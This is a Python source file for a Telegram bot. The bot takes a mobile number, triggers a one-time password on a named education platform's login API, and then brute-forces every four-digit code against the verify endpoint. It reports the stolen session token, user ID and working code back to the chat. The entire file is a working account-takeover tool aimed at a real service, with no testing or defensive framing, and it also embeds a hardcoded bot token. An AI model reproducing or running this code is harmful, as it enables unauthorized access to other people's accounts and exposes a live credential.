from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import requests
import asyncio
import time

SEND_OTP_URL = "https://learning.motion.ac.in/motioneducation/api/user/send-otp"
VERIFY_OTP_URL = "https://learning.motion.ac.in/motioneducation/api/user/verify-otp"


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Please enter your mobile number:")


async def send_otp(mobile_number):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json"}
    data = {"mobile_number": mobile_number}
    response = requests.post(SEND_OTP_URL, json=data, headers=headers)
    return response.status_code == 200


def verify_otp_sync(mobile_number, otp):
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json"}
    data = {"mobile_number": mobile_number, "otp": otp, "firebaseToken": "", "loginType": "Web"}
    response = requests.post(VERIFY_OTP_URL, json=data, headers=headers)
    if response.status_code == 200 and response.json().get("status") == 200:
        data = response.json().get("data", {})
        return data.get("token"), data.get("user_data", {}).get("mobile"), data.get("user_data", {}).get("user_id")
    return None


async def handle_mobile_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mobile_number = update.message.text
    if not mobile_number.isdigit() or len(mobile_number) != 10:
        await update.message.reply_text("Invalid mobile number. Please try again.")
        return

    if await send_otp(mobile_number):
        context.user_data["mobile_number"] = mobile_number
        await update.message.reply_text("OTP sent to your mobile number. Please wait for automatic verification.")
        await auto_verify_otp(update, context, mobile_number)
    else:
        await update.message.reply_text("Failed to send OTP. Please try again.")


async def auto_verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, mobile_number):
    chat_id = update.message.chat_id
    progress_message = await context.bot.send_message(chat_id, "Verifying OTPs...\nLast OTP Checked: None\nTime Left: Calculating...")

    batch_size = 1000
    total_otps = 9999 - 1000
    start_time = time.time()

    for start in range(1000, 10000, batch_size):
        end = min(start + batch_size, 10000)
        result = await process_batch(start, end, mobile_number, context, chat_id, progress_message, start_time, total_otps)
        if result:
            token, mobile, user_id, otp = result
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"OTP Verified!\n\nMobile: {mobile}\nToken: {token}\nUser ID: {user_id}\nValid OTP: {otp}"
            )
            return

    await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_message.message_id, text="Failed to verify OTP. Please try again.")


async def process_batch(start, end, mobile_number, context, chat_id, progress_message, start_time, total_otps):
    last_update_time = time.time()

    for current_otp in range(start, end):
        result = verify_otp_sync(mobile_number, current_otp)
        if result:
            token, mobile, user_id = result
            return token, mobile, user_id, current_otp

        # Update progress every 3 seconds
        if time.time() - last_update_time >= 3:
            elapsed_time = time.time() - start_time
            otps_checked = current_otp - 1000
            remaining_otps = total_otps - otps_checked
            estimated_time_left = (elapsed_time / otps_checked) * remaining_otps if otps_checked > 0 else "Calculating..."

            time_left_text = f"{int(estimated_time_left // 60)} minutes {int(estimated_time_left % 60)} seconds" if isinstance(estimated_time_left, float) else estimated_time_left

            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_message.message_id,
                text=f"Verifying OTPs...\nLast OTP Checked: {current_otp}\nTime Left: {time_left_text}"
            )
            last_update_time = time.time()

    return None


def main():
    application = ApplicationBuilder().token("7489407688:AAGbVyKvGqpp5fllkxWWU2tWR3dw3SrGI6c").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_mobile_number))

    application.run_polling()


if __name__ == "__main__":
    main()
